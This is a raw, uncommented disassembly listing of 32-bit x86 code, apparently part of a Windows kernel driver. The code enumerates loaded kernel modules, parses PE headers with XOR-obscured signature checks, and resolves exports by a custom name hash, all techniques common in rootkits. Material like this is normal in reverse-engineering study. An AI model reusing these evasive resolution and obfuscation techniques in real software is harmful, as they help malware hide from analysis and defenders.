   12b3e:	8d 73 08             	lea    0x8(%ebx),%esi
   12b41:	57                   	push   %edi
   12b42:	c6 43 04 00          	movb   $0x0,0x4(%ebx)
   12b46:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   12b4c:	75 20                	jne    0x12b6e
   12b4e:	56                   	push   %esi
   12b4f:	50                   	push   %eax
   12b50:	ff 15 30 34 01 00    	call   *0x13430
   12b56:	85 c0                	test   %eax,%eax
   12b58:	89 45 00             	mov    %eax,0x0(%ebp)
   12b5b:	75 11                	jne    0x12b6e
   12b5d:	39 06                	cmp    %eax,(%esi)
   12b5f:	75 09                	jne    0x12b6a
   12b61:	c7 45 00 01 00 00 c0 	movl   $0xc0000001,0x0(%ebp)
   12b68:	eb 04                	jmp    0x12b6e
   12b6a:	c6 43 04 01          	movb   $0x1,0x4(%ebx)
   12b6e:	33 c0                	xor    %eax,%eax
   12b70:	39 45 00             	cmp    %eax,0x0(%ebp)
   12b73:	8d 7b 0c             	lea    0xc(%ebx),%edi
   12b76:	89 07                	mov    %eax,(%edi)
   12b78:	89 47 04             	mov    %eax,0x4(%edi)
   12b7b:	89 47 08             	mov    %eax,0x8(%edi)
   12b7e:	89 47 0c             	mov    %eax,0xc(%edi)
   12b81:	89 47 10             	mov    %eax,0x10(%edi)
   12b84:	89 47 14             	mov    %eax,0x14(%edi)
   12b87:	75 1a                	jne    0x12ba3
   12b89:	8d 74 24 14          	lea    0x14(%esp),%esi
   12b8d:	e8 8e e0 ff ff       	call   0x10c20
   12b92:	8b 4b 08             	mov    0x8(%ebx),%ecx
   12b95:	8b 54 24 14          	mov    0x14(%esp),%edx
   12b99:	8b 42 18             	mov    0x18(%edx),%eax
   12b9c:	57                   	push   %edi
   12b9d:	51                   	push   %ecx
   12b9e:	ff d0                	call   *%eax
   12ba0:	c6 03 01             	movb   $0x1,(%ebx)
   12ba3:	5f                   	pop    %edi
   12ba4:	5e                   	pop    %esi
   12ba5:	8b c3                	mov    %ebx,%eax
   12ba7:	5d                   	pop    %ebp
   12ba8:	59                   	pop    %ecx
   12ba9:	c2 04 00             	ret    $0x4
   12bac:	cc                   	int3
   12bad:	cc                   	int3
   12bae:	cc                   	int3
   12baf:	cc                   	int3
   12bb0:	83 ec 10             	sub    $0x10,%esp
   12bb3:	53                   	push   %ebx
   12bb4:	55                   	push   %ebp
   12bb5:	56                   	push   %esi
   12bb6:	57                   	push   %edi
   12bb7:	68 50 32 01 00       	push   $0x13250
   12bbc:	8d 44 24 1c          	lea    0x1c(%esp),%eax
   12bc0:	50                   	push   %eax
   12bc1:	ff 15 c0 33 01 00    	call   *0x133c0
   12bc7:	8d 4c 24 18          	lea    0x18(%esp),%ecx
   12bcb:	51                   	push   %ecx
   12bcc:	ff 15 20 34 01 00    	call   *0x13420
   12bd2:	8b f8                	mov    %eax,%edi
   12bd4:	33 db                	xor    %ebx,%ebx
   12bd6:	3b fb                	cmp    %ebx,%edi
   12bd8:	0f 84 a1 00 00 00    	je     0x12c7f
   12bde:	8d 54 24 10          	lea    0x10(%esp),%edx
   12be2:	52                   	push   %edx
   12be3:	53                   	push   %ebx
   12be4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
   12be8:	50                   	push   %eax
   12be9:	6a 0b                	push   $0xb
   12beb:	89 5c 24 20          	mov    %ebx,0x20(%esp)
   12bef:	89 5c 24 24          	mov    %ebx,0x24(%esp)
   12bf3:	ff d7                	call   *%edi
   12bf5:	3d 04 00 00 c0       	cmp    $0xc0000004,%eax
   12bfa:	0f 85 7f 00 00 00    	jne    0x12c7f
   12c00:	8b 44 24 10          	mov    0x10(%esp),%eax
   12c04:	3b c3                	cmp    %ebx,%eax
   12c06:	74 77                	je     0x12c7f
   12c08:	50                   	push   %eax
   12c09:	53                   	push   %ebx
   12c0a:	ff 15 a0 33 01 00    	call   *0x133a0
   12c10:	8b f0                	mov    %eax,%esi
   12c12:	3b f3                	cmp    %ebx,%esi
   12c14:	74 69                	je     0x12c7f
   12c16:	8b 54 24 10          	mov    0x10(%esp),%edx
   12c1a:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   12c1e:	51                   	push   %ecx
   12c1f:	52                   	push   %edx
   12c20:	56                   	push   %esi
   12c21:	6a 0b                	push   $0xb
   12c23:	ff d7                	call   *%edi
   12c25:	85 c0                	test   %eax,%eax
   12c27:	74 14                	je     0x12c3d
   12c29:	53                   	push   %ebx
   12c2a:	56                   	push   %esi
   12c2b:	ff 15 f8 33 01 00    	call   *0x133f8
   12c31:	33 c0                	xor    %eax,%eax
   12c33:	5f                   	pop    %edi
   12c34:	5e                   	pop    %esi
   12c35:	5d                   	pop    %ebp
   12c36:	5b                   	pop    %ebx
   12c37:	83 c4 10             	add    $0x10,%esp
   12c3a:	c2 04 00             	ret    $0x4
   12c3d:	33 ff                	xor    %edi,%edi
   12c3f:	39 1e                	cmp    %ebx,(%esi)
   12c41:	76 33                	jbe    0x12c76
   12c43:	8d 6e 1e             	lea    0x1e(%esi),%ebp
   12c46:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
   12c4a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
   12c4e:	03 c3                	add    %ebx,%eax
   12c50:	8d 44 30 20          	lea    0x20(%eax,%esi,1),%eax
   12c54:	51                   	push   %ecx
   12c55:	50                   	push   %eax
   12c56:	ff 15 1c 34 01 00    	call   *0x1341c
   12c5c:	83 c4 08             	add    $0x8,%esp
   12c5f:	85 c0                	test   %eax,%eax
   12c61:	74 28                	je     0x12c8b
   12c63:	83 c7 01             	add    $0x1,%edi
   12c66:	81 c3 1c 01 00 00    	add    $0x11c,%ebx
   12c6c:	81 c5 1c 01 00 00    	add    $0x11c,%ebp
   12c72:	3b 3e                	cmp    (%esi),%edi
   12c74:	72 d0                	jb     0x12c46
   12c76:	6a 00                	push   $0x0
   12c78:	56                   	push   %esi
   12c79:	ff 15 f8 33 01 00    	call   *0x133f8
   12c7f:	33 c0                	xor    %eax,%eax
   12c81:	5f                   	pop    %edi
   12c82:	5e                   	pop    %esi
   12c83:	5d                   	pop    %ebp
   12c84:	5b                   	pop    %ebx
   12c85:	83 c4 10             	add    $0x10,%esp
   12c88:	c2 04 00             	ret    $0x4
   12c8b:	69 ff 1c 01 00 00    	imul   $0x11c,%edi,%edi
   12c91:	8b 7c 37 0c          	mov    0xc(%edi,%esi,1),%edi
   12c95:	6a 00                	push   $0x0
   12c97:	56                   	push   %esi
   12c98:	ff 15 f8 33 01 00    	call   *0x133f8
   12c9e:	8b c7                	mov    %edi,%eax
   12ca0:	5f                   	pop    %edi
   12ca1:	5e                   	pop    %esi
   12ca2:	5d                   	pop    %ebp
   12ca3:	5b                   	pop    %ebx
   12ca4:	83 c4 10             	add    $0x10,%esp
   12ca7:	c2 04 00             	ret    $0x4
   12caa:	cc                   	int3
   12cab:	cc                   	int3
   12cac:	cc                   	int3
   12cad:	cc                   	int3
   12cae:	cc                   	int3
   12caf:	cc                   	int3
   12cb0:	55                   	push   %ebp
   12cb1:	8b ec                	mov    %esp,%ebp
   12cb3:	83 e4 f8             	and    $0xfffffff8,%esp
   12cb6:	68 90 32 01 00       	push   $0x13290
   12cbb:	e8 f0 fe ff ff       	call   0x12bb0
   12cc0:	85 c0                	test   %eax,%eax
   12cc2:	75 0a                	jne    0x12cce
   12cc4:	68 a0 32 01 00       	push   $0x132a0
   12cc9:	e8 e2 fe ff ff       	call   0x12bb0
   12cce:	8b e5                	mov    %ebp,%esp
   12cd0:	5d                   	pop    %ebp
   12cd1:	c3                   	ret
   12cd2:	cc                   	int3
   12cd3:	cc                   	int3
   12cd4:	cc                   	int3
   12cd5:	cc                   	int3
   12cd6:	cc                   	int3
   12cd7:	cc                   	int3
   12cd8:	cc                   	int3
   12cd9:	cc                   	int3
   12cda:	cc                   	int3
   12cdb:	cc                   	int3
   12cdc:	cc                   	int3
   12cdd:	cc                   	int3
   12cde:	cc                   	int3
   12cdf:	cc                   	int3
   12ce0:	83 ec 08             	sub    $0x8,%esp
   12ce3:	6a 00                	push   $0x0
   12ce5:	6a 00                	push   $0x0
   12ce7:	8d 44 24 0c          	lea    0xc(%esp),%eax
   12ceb:	50                   	push   %eax
   12cec:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
   12cf0:	51                   	push   %ecx
   12cf1:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
   12cf8:	00 
   12cf9:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
   12d00:	00 
   12d01:	ff 15 24 34 01 00    	call   *0x13424
   12d07:	83 3c 24 05          	cmpl   $0x5,(%esp)
   12d0b:	75 10                	jne    0x12d1d
   12d0d:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
   12d12:	75 09                	jne    0x12d1d
   12d14:	b8 01 00 00 00       	mov    $0x1,%eax
   12d19:	83 c4 08             	add    $0x8,%esp
   12d1c:	c3                   	ret
   12d1d:	33 c0                	xor    %eax,%eax
   12d1f:	83 c4 08             	add    $0x8,%esp
   12d22:	c3                   	ret
   12d23:	cc                   	int3
   12d24:	cc                   	int3
   12d25:	cc                   	int3
   12d26:	cc                   	int3
   12d27:	cc                   	int3
   12d28:	cc                   	int3
   12d29:	cc                   	int3
   12d2a:	cc                   	int3
   12d2b:	cc                   	int3
   12d2c:	cc                   	int3
   12d2d:	cc                   	int3
   12d2e:	cc                   	int3
   12d2f:	cc                   	int3
   12d30:	83 ec 08             	sub    $0x8,%esp
   12d33:	6a 00                	push   $0x0
   12d35:	6a 00                	push   $0x0
   12d37:	8d 44 24 0c          	lea    0xc(%esp),%eax
   12d3b:	50                   	push   %eax
   12d3c:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
   12d40:	51                   	push   %ecx
   12d41:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
   12d48:	00 
   12d49:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
   12d50:	00 
   12d51:	ff 15 24 34 01 00    	call   *0x13424
   12d57:	83 3c 24 05          	cmpl   $0x5,(%esp)
   12d5b:	75 10                	jne    0x12d6d
   12d5d:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
   12d62:	75 09                	jne    0x12d6d
   12d64:	b8 01 00 00 00       	mov    $0x1,%eax
   12d69:	83 c4 08             	add    $0x8,%esp
   12d6c:	c3                   	ret
   12d6d:	33 c0                	xor    %eax,%eax
   12d6f:	83 c4 08             	add    $0x8,%esp
   12d72:	c3                   	ret
   12d73:	cc                   	int3
   12d74:	cc                   	int3
   12d75:	cc                   	int3
   12d76:	cc                   	int3
   12d77:	cc                   	int3
   12d78:	cc                   	int3
   12d79:	cc                   	int3
   12d7a:	cc                   	int3
   12d7b:	cc                   	int3
   12d7c:	cc                   	int3
   12d7d:	cc                   	int3
   12d7e:	cc                   	int3
   12d7f:	cc                   	int3
   12d80:	83 ec 10             	sub    $0x10,%esp
   12d83:	53                   	push   %ebx
   12d84:	56                   	push   %esi
   12d85:	8d 44 24 14          	lea    0x14(%esp),%eax
   12d89:	50                   	push   %eax
   12d8a:	33 db                	xor    %ebx,%ebx
   12d8c:	51                   	push   %ecx
   12d8d:	88 5c 24 18          	mov    %bl,0x18(%esp)
   12d91:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
   12d95:	ff 15 30 34 01 00    	call   *0x13430
   12d9b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   12d9f:	8b f0                	mov    %eax,%esi
   12da1:	3b f3                	cmp    %ebx,%esi
   12da3:	75 09                	jne    0x12dae
   12da5:	3b cb                	cmp    %ebx,%ecx
   12da7:	75 1f                	jne    0x12dc8
   12da9:	be 01 00 00 c0       	mov    $0xc0000001,%esi
   12dae:	38 5c 24 10          	cmp    %bl,0x10(%esp)
   12db2:	74 75                	je     0x12e29
   12db4:	88 5c 24 10          	mov    %bl,0x10(%esp)
   12db8:	ff 15 34 34 01 00    	call   *0x13434
   12dbe:	8b c6                	mov    %esi,%eax
   12dc0:	5e                   	pop    %esi
   12dc1:	5b                   	pop    %ebx
   12dc2:	83 c4 10             	add    $0x10,%esp
   12dc5:	c2 04 00             	ret    $0x4
   12dc8:	8d 54 24 08          	lea    0x8(%esp),%edx
   12dcc:	52                   	push   %edx
   12dcd:	53                   	push   %ebx
   12dce:	53                   	push   %ebx
   12dcf:	53                   	push   %ebx
   12dd0:	53                   	push   %ebx
   12dd1:	53                   	push   %ebx
   12dd2:	51                   	push   %ecx
   12dd3:	c6 44 24 2c 01       	movb   $0x1,0x2c(%esp)
   12dd8:	89 5c 24 24          	mov    %ebx,0x24(%esp)
   12ddc:	ff 15 2c 34 01 00    	call   *0x1342c
   12de2:	8b f0                	mov    %eax,%esi
   12de4:	3b f3                	cmp    %ebx,%esi
   12de6:	75 1e                	jne    0x12e06
   12de8:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
   12dec:	8b 54 24 08          	mov    0x8(%esp),%edx
   12df0:	8d 44 24 0c          	lea    0xc(%esp),%eax
   12df4:	50                   	push   %eax
   12df5:	6a 18                	push   $0x18
   12df7:	51                   	push   %ecx
   12df8:	53                   	push   %ebx
   12df9:	52                   	push   %edx
   12dfa:	89 5c 24 20          	mov    %ebx,0x20(%esp)
   12dfe:	ff 15 28 34 01 00    	call   *0x13428
   12e04:	8b f0                	mov    %eax,%esi
   12e06:	8b 44 24 08          	mov    0x8(%esp),%eax
   12e0a:	3b c3                	cmp    %ebx,%eax
   12e0c:	74 07                	je     0x12e15
   12e0e:	50                   	push   %eax
   12e0f:	ff 15 c4 33 01 00    	call   *0x133c4
   12e15:	38 5c 24 10          	cmp    %bl,0x10(%esp)
   12e19:	74 0e                	je     0x12e29
   12e1b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   12e1f:	88 5c 24 10          	mov    %bl,0x10(%esp)
   12e23:	ff 15 34 34 01 00    	call   *0x13434
   12e29:	8b c6                	mov    %esi,%eax
   12e2b:	5e                   	pop    %esi
   12e2c:	5b                   	pop    %ebx
   12e2d:	83 c4 10             	add    $0x10,%esp
   12e30:	c2 04 00             	ret    $0x4
   12e33:	8b 54 24 04          	mov    0x4(%esp),%edx
   12e37:	8a 0a                	mov    (%edx),%cl
   12e39:	33 c0                	xor    %eax,%eax
   12e3b:	84 c9                	test   %cl,%cl
   12e3d:	74 24                	je     0x12e63
   12e3f:	56                   	push   %esi
   12e40:	0f be c9             	movsbl %cl,%ecx
   12e43:	8b f1                	mov    %ecx,%esi
   12e45:	6b f6 11             	imul   $0x11,%esi,%esi
   12e48:	83 c6 0c             	add    $0xc,%esi
   12e4b:	0f af f1             	imul   %ecx,%esi
   12e4e:	8b c8                	mov    %eax,%ecx
   12e50:	6b c9 07             	imul   $0x7,%ecx,%ecx
   12e53:	41                   	inc    %ecx
   12e54:	0f af c8             	imul   %eax,%ecx
   12e57:	03 f1                	add    %ecx,%esi
   12e59:	42                   	inc    %edx
   12e5a:	8a 0a                	mov    (%edx),%cl
   12e5c:	8b c6                	mov    %esi,%eax
   12e5e:	84 c9                	test   %cl,%cl
   12e60:	75 de                	jne    0x12e40
   12e62:	5e                   	pop    %esi
   12e63:	c3                   	ret
   12e64:	55                   	push   %ebp
   12e65:	8b ec                	mov    %esp,%ebp
   12e67:	8b 45 08             	mov    0x8(%ebp),%eax
   12e6a:	53                   	push   %ebx
   12e6b:	0f b7 58 18          	movzwl 0x18(%eax),%ebx
   12e6f:	56                   	push   %esi
   12e70:	8b 70 14             	mov    0x14(%eax),%esi
   12e73:	57                   	push   %edi
   12e74:	33 c9                	xor    %ecx,%ecx
   12e76:	33 ff                	xor    %edi,%edi
   12e78:	66 3b cb             	cmp    %bx,%cx
   12e7b:	73 32                	jae    0x12eaf
   12e7d:	8b 40 08             	mov    0x8(%eax),%eax
   12e80:	89 45 08             	mov    %eax,0x8(%ebp)
   12e83:	0f b7 c7             	movzwl %di,%eax
   12e86:	6b c0 28             	imul   $0x28,%eax,%eax
   12e89:	03 c6                	add    %esi,%eax
   12e8b:	8b 48 08             	mov    0x8(%eax),%ecx
   12e8e:	8b 50 10             	mov    0x10(%eax),%edx
   12e91:	3b ca                	cmp    %edx,%ecx
   12e93:	72 02                	jb     0x12e97
   12e95:	8b ca                	mov    %edx,%ecx
   12e97:	8b 40 0c             	mov    0xc(%eax),%eax
   12e9a:	03 45 08             	add    0x8(%ebp),%eax
   12e9d:	39 45 0c             	cmp    %eax,0xc(%ebp)
   12ea0:	72 07                	jb     0x12ea9
   12ea2:	03 c1                	add    %ecx,%eax
   12ea4:	39 45 0c             	cmp    %eax,0xc(%ebp)
   12ea7:	72 0d                	jb     0x12eb6
   12ea9:	47                   	inc    %edi
   12eaa:	66 3b fb             	cmp    %bx,%di
   12ead:	72 d4                	jb     0x12e83
   12eaf:	33 c0                	xor    %eax,%eax
   12eb1:	5f                   	pop    %edi
   12eb2:	5e                   	pop    %esi
   12eb3:	5b                   	pop    %ebx
   12eb4:	5d                   	pop    %ebp
   12eb5:	c3                   	ret
   12eb6:	0f b7 c7             	movzwl %di,%eax
   12eb9:	6b c0 28             	imul   $0x28,%eax,%eax
   12ebc:	03 c6                	add    %esi,%eax
   12ebe:	eb f1                	jmp    0x12eb1
   12ec0:	55                   	push   %ebp
   12ec1:	8b ec                	mov    %esp,%ebp
   12ec3:	51                   	push   %ecx
   12ec4:	0f b7 48 18          	movzwl 0x18(%eax),%ecx
   12ec8:	56                   	push   %esi
   12ec9:	8b 70 14             	mov    0x14(%eax),%esi
   12ecc:	89 4d fc             	mov    %ecx,-0x4(%ebp)
   12ecf:	3b 58 1a             	cmp    0x1a(%eax),%ebx
   12ed2:	72 04                	jb     0x12ed8
   12ed4:	33 c0                	xor    %eax,%eax
   12ed6:	eb 5b                	jmp    0x12f33
   12ed8:	57                   	push   %edi
   12ed9:	33 ff                	xor    %edi,%edi
   12edb:	39 78 04             	cmp    %edi,0x4(%eax)
   12ede:	75 05                	jne    0x12ee5
   12ee0:	33 c0                	xor    %eax,%eax
   12ee2:	40                   	inc    %eax
   12ee3:	eb 4d                	jmp    0x12f32
   12ee5:	33 c0                	xor    %eax,%eax
   12ee7:	66 3b c1             	cmp    %cx,%ax
   12eea:	73 44                	jae    0x12f30
   12eec:	0f b7 c7             	movzwl %di,%eax
   12eef:	6b c0 28             	imul   $0x28,%eax,%eax
   12ef2:	03 c6                	add    %esi,%eax
   12ef4:	8b 48 08             	mov    0x8(%eax),%ecx
   12ef7:	8b 50 10             	mov    0x10(%eax),%edx
   12efa:	3b ca                	cmp    %edx,%ecx
   12efc:	72 02                	jb     0x12f00
   12efe:	8b ca                	mov    %edx,%ecx
   12f00:	8b 40 0c             	mov    0xc(%eax),%eax
   12f03:	3b d8                	cmp    %eax,%ebx
   12f05:	72 06                	jb     0x12f0d
   12f07:	03 c1                	add    %ecx,%eax
   12f09:	3b d8                	cmp    %eax,%ebx
   12f0b:	72 09                	jb     0x12f16
   12f0d:	47                   	inc    %edi
   12f0e:	66 3b 7d fc          	cmp    -0x4(%ebp),%di
   12f12:	72 d8                	jb     0x12eec
   12f14:	eb 1a                	jmp    0x12f30
   12f16:	0f b7 c7             	movzwl %di,%eax
   12f19:	6b c0 28             	imul   $0x28,%eax,%eax
   12f1c:	8b 74 30 24          	mov    0x24(%eax,%esi,1),%esi
   12f20:	f7 c6 00 00 00 02    	test   $0x2000000,%esi
   12f26:	75 08                	jne    0x12f30
   12f28:	f7 c6 00 00 00 40    	test   $0x40000000,%esi
   12f2e:	75 b0                	jne    0x12ee0
   12f30:	33 c0                	xor    %eax,%eax
   12f32:	5f                   	pop    %edi
   12f33:	5e                   	pop    %esi
   12f34:	c9                   	leave
   12f35:	c3                   	ret
   12f36:	56                   	push   %esi
   12f37:	8b 74 24 0c          	mov    0xc(%esp),%esi
   12f3b:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   12f40:	66 39 06             	cmp    %ax,(%esi)
   12f43:	74 05                	je     0x12f4a
   12f45:	33 c0                	xor    %eax,%eax
   12f47:	40                   	inc    %eax
   12f48:	5e                   	pop    %esi
   12f49:	c3                   	ret
   12f4a:	8b 46 3c             	mov    0x3c(%esi),%eax
   12f4d:	03 c6                	add    %esi,%eax
   12f4f:	8b 08                	mov    (%eax),%ecx
   12f51:	81 f1 84 f2 50 f7    	xor    $0xf750f284,%ecx
   12f57:	81 f9 d4 b7 50 f7    	cmp    $0xf750b7d4,%ecx
   12f5d:	75 e6                	jne    0x12f45
   12f5f:	0f b7 48 04          	movzwl 0x4(%eax),%ecx
   12f63:	53                   	push   %ebx
   12f64:	57                   	push   %edi
   12f65:	8b f9                	mov    %ecx,%edi
   12f67:	ba 03 58 00 00       	mov    $0x5803,%edx
   12f6c:	81 f7 4f 59 00 00    	xor    $0x594f,%edi
   12f72:	8b da                	mov    %edx,%ebx
   12f74:	66 3b df             	cmp    %di,%bx
   12f77:	75 25                	jne    0x12f9e
   12f79:	b9 08 59 00 00       	mov    $0x5908,%ecx
   12f7e:	66 33 48 18          	xor    0x18(%eax),%cx
   12f82:	66 3b ca             	cmp    %dx,%cx
   12f85:	75 7a                	jne    0x13001
   12f87:	b9 e0 00 00 00       	mov    $0xe0,%ecx
   12f8c:	66 39 48 14          	cmp    %cx,0x14(%eax)
   12f90:	75 6f                	jne    0x13001
   12f92:	8b 4c 24 10          	mov    0x10(%esp),%ecx
   12f96:	83 21 00             	andl   $0x0,(%ecx)
   12f99:	8d 50 78             	lea    0x78(%eax),%edx
   12f9c:	eb 36                	jmp    0x12fd4
   12f9e:	81 f1 67 de 00 00    	xor    $0xde67,%ecx
   12fa4:	8b fa                	mov    %edx,%edi
   12fa6:	66 3b f9             	cmp    %cx,%di
   12fa9:	75 56                	jne    0x13001
   12fab:	b9 08 5a 00 00       	mov    $0x5a08,%ecx
   12fb0:	66 33 48 18          	xor    0x18(%eax),%cx
   12fb4:	66 3b ca             	cmp    %dx,%cx
   12fb7:	75 48                	jne    0x13001
   12fb9:	b9 f0 00 00 00       	mov    $0xf0,%ecx
   12fbe:	66 39 48 14          	cmp    %cx,0x14(%eax)
   12fc2:	75 3d                	jne    0x13001
   12fc4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
   12fc8:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
   12fce:	8d 90 88 00 00 00    	lea    0x88(%eax),%edx
   12fd4:	89 51 10             	mov    %edx,0x10(%ecx)
   12fd7:	8b 50 50             	mov    0x50(%eax),%edx
   12fda:	89 51 1a             	mov    %edx,0x1a(%ecx)
   12fdd:	0f b7 50 14          	movzwl 0x14(%eax),%edx
   12fe1:	8d 54 02 18          	lea    0x18(%edx,%eax,1),%edx
   12fe5:	89 51 14             	mov    %edx,0x14(%ecx)
   12fe8:	66 8b 50 06          	mov    0x6(%eax),%dx
   12fec:	89 41 0c             	mov    %eax,0xc(%ecx)
   12fef:	8b 44 24 18          	mov    0x18(%esp),%eax
   12ff3:	89 41 04             	mov    %eax,0x4(%ecx)
   12ff6:	66 89 51 18          	mov    %dx,0x18(%ecx)
   12ffa:	89 71 08             	mov    %esi,0x8(%ecx)
   12ffd:	33 c0                	xor    %eax,%eax
   12fff:	eb 03                	jmp    0x13004
   13001:	33 c0                	xor    %eax,%eax
   13003:	40                   	inc    %eax
   13004:	5f                   	pop    %edi
   13005:	5b                   	pop    %ebx
   13006:	5e                   	pop    %esi
   13007:	c3                   	ret
   13008:	53                   	push   %ebx
   13009:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
   1300d:	56                   	push   %esi
   1300e:	8b 74 24 0c          	mov    0xc(%esp),%esi
   13012:	8b c6                	mov    %esi,%eax
   13014:	e8 a7 fe ff ff       	call   0x12ec0
   13019:	85 c0                	test   %eax,%eax
   1301b:	74 05                	je     0x13022
   1301d:	8b 46 08             	mov    0x8(%esi),%eax
   13020:	03 c3                	add    %ebx,%eax
   13022:	5e                   	pop    %esi
   13023:	5b                   	pop    %ebx
   13024:	c3                   	ret
   13025:	8b 4c 24 04          	mov    0x4(%esp),%ecx
   13029:	8b 44 24 08          	mov    0x8(%esp),%eax
   1302d:	8b 51 10             	mov    0x10(%ecx),%edx
   13030:	56                   	push   %esi
   13031:	8d 34 c2             	lea    (%edx,%eax,8),%esi
   13034:	83 f8 10             	cmp    $0x10,%eax
   13037:	72 05                	jb     0x1303e
   13039:	33 c0                	xor    %eax,%eax
   1303b:	40                   	inc    %eax
   1303c:	5e                   	pop    %esi
   1303d:	c3                   	ret
   1303e:	8b 06                	mov    (%esi),%eax
   13040:	85 c0                	test   %eax,%eax
   13042:	75 09                	jne    0x1304d
   13044:	39 46 04             	cmp    %eax,0x4(%esi)
   13047:	5e                   	pop    %esi
   13048:	0f 94 c0             	sete   %al
   1304b:	40                   	inc    %eax
   1304c:	c3                   	ret
   1304d:	8b 56 04             	mov    0x4(%esi),%edx
   13050:	03 d0                	add    %eax,%edx
   13052:	3b 51 1a             	cmp    0x1a(%ecx),%edx
   13055:	77 e2                	ja     0x13039
   13057:	50                   	push   %eax
   13058:	51                   	push   %ecx
   13059:	e8 aa ff ff ff       	call   0x13008
   1305e:	8b 54 24 1c          	mov    0x1c(%esp),%edx
   13062:	59                   	pop    %ecx
   13063:	59                   	pop    %ecx
   13064:	8b 4c 24 10          	mov    0x10(%esp),%ecx
   13068:	89 01                	mov    %eax,(%ecx)
   1306a:	8b 46 04             	mov    0x4(%esi),%eax
   1306d:	89 02                	mov    %eax,(%edx)
   1306f:	33 c0                	xor    %eax,%eax
   13071:	39 01                	cmp    %eax,(%ecx)
   13073:	5e                   	pop    %esi
   13074:	0f 94 c0             	sete   %al
   13077:	c3                   	ret
   13078:	56                   	push   %esi
   13079:	8b f0                	mov    %eax,%esi
   1307b:	ff 76 1c             	push   0x1c(%esi)
   1307e:	ff 74 24 0c          	push   0xc(%esp)
   13082:	e8 81 ff ff ff       	call   0x13008
   13087:	59                   	pop    %ecx
   13088:	59                   	pop    %ecx
   13089:	85 c0                	test   %eax,%eax
   1308b:	74 2f                	je     0x130bc
   1308d:	0f b7 4c 24 10       	movzwl 0x10(%esp),%ecx
   13092:	3b 4e 14             	cmp    0x14(%esi),%ecx
   13095:	73 25                	jae    0x130bc
   13097:	8b 04 88             	mov    (%eax,%ecx,4),%eax
   1309a:	85 c0                	test   %eax,%eax
   1309c:	74 1e                	je     0x130bc
   1309e:	50                   	push   %eax
   1309f:	ff 74 24 0c          	push   0xc(%esp)
   130a3:	e8 60 ff ff ff       	call   0x13008
   130a8:	59                   	pop    %ecx
   130a9:	59                   	pop    %ecx
   130aa:	85 c0                	test   %eax,%eax
   130ac:	74 0e                	je     0x130bc
   130ae:	3b c6                	cmp    %esi,%eax
   130b0:	72 0c                	jb     0x130be
   130b2:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
   130b6:	03 f1                	add    %ecx,%esi
   130b8:	3b c6                	cmp    %esi,%eax
   130ba:	73 02                	jae    0x130be
   130bc:	33 c0                	xor    %eax,%eax
   130be:	5e                   	pop    %esi
   130bf:	c3                   	ret
   130c0:	55                   	push   %ebp
   130c1:	8b ec                	mov    %esp,%ebp
   130c3:	83 ec 0c             	sub    $0xc,%esp
   130c6:	56                   	push   %esi
   130c7:	8d 45 f4             	lea    -0xc(%ebp),%eax
   130ca:	50                   	push   %eax
   130cb:	8d 45 fc             	lea    -0x4(%ebp),%eax
   130ce:	50                   	push   %eax
   130cf:	33 f6                	xor    %esi,%esi
   130d1:	56                   	push   %esi
   130d2:	ff 75 08             	push   0x8(%ebp)
   130d5:	e8 4b ff ff ff       	call   0x13025
   130da:	83 c4 10             	add    $0x10,%esp
   130dd:	85 c0                	test   %eax,%eax
   130df:	74 04                	je     0x130e5
   130e1:	33 c0                	xor    %eax,%eax
   130e3:	eb 61                	jmp    0x13146
   130e5:	57                   	push   %edi
   130e6:	8b 7d fc             	mov    -0x4(%ebp),%edi
   130e9:	ff 77 20             	push   0x20(%edi)
   130ec:	ff 75 08             	push   0x8(%ebp)
   130ef:	e8 14 ff ff ff       	call   0x13008
   130f4:	59                   	pop    %ecx
   130f5:	59                   	pop    %ecx
   130f6:	89 45 fc             	mov    %eax,-0x4(%ebp)
   130f9:	3b c6                	cmp    %esi,%eax
   130fb:	74 14                	je     0x13111
   130fd:	ff 77 24             	push   0x24(%edi)
   13100:	ff 75 08             	push   0x8(%ebp)
   13103:	e8 00 ff ff ff       	call   0x13008
   13108:	59                   	pop    %ecx
   13109:	59                   	pop    %ecx
   1310a:	89 45 f8             	mov    %eax,-0x8(%ebp)
   1310d:	3b c6                	cmp    %esi,%eax
   1310f:	75 04                	jne    0x13115
   13111:	33 c0                	xor    %eax,%eax
   13113:	eb 30                	jmp    0x13145
   13115:	53                   	push   %ebx
   13116:	8b 5f 18             	mov    0x18(%edi),%ebx
   13119:	85 db                	test   %ebx,%ebx
   1311b:	76 25                	jbe    0x13142
   1311d:	8b 45 fc             	mov    -0x4(%ebp),%eax
   13120:	ff 34 b0             	push   (%eax,%esi,4)
   13123:	ff 75 08             	push   0x8(%ebp)
   13126:	e8 dd fe ff ff       	call   0x13008
   1312b:	59                   	pop    %ecx
   1312c:	59                   	pop    %ecx
   1312d:	85 c0                	test   %eax,%eax
   1312f:	74 11                	je     0x13142
   13131:	50                   	push   %eax
   13132:	e8 fc fc ff ff       	call   0x12e33
   13137:	59                   	pop    %ecx
   13138:	3b 45 0c             	cmp    0xc(%ebp),%eax
   1313b:	74 0c                	je     0x13149
   1313d:	46                   	inc    %esi
   1313e:	3b f3                	cmp    %ebx,%esi
   13140:	72 db                	jb     0x1311d
   13142:	33 c0                	xor    %eax,%eax
   13144:	5b                   	pop    %ebx
   13145:	5f                   	pop    %edi
   13146:	5e                   	pop    %esi
   13147:	c9                   	leave
   13148:	c3                   	ret
